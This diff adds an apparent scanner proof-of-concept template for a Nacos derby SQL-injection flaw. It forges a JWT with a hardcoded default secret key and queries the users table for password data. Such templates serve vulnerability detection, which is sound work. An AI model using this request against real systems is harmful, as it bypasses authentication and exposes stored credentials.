@@ -1,0 +1,26 @@
+id: poc-yaml-nacos-derby-sql-exec
+info:
+  name: Nacos ops/derby 接口 SQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: nacos
+variables:
+  r_key: hex_encode(base64_decode("SecretKey01234567890123456789012345678901234567890123456789012345678"))
+  r_token: gen_jwt("{\"sub\":\"nacos\"}", "HS256", hex_decode(r_key))
+requests:
+- method: GET
+  path: /nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20
+  headers:
+    User-Agent: Nacos-Server
+    accessToken: '{{.r_token}}'
+  expression: 'status_code == 200 && contains(headers, "json") &&
+
+    contains(body, "\"data\"") &&
+
+    contains(body, "password") &&
+
+    !contains(body, "<")
+
+    '
+transport: http
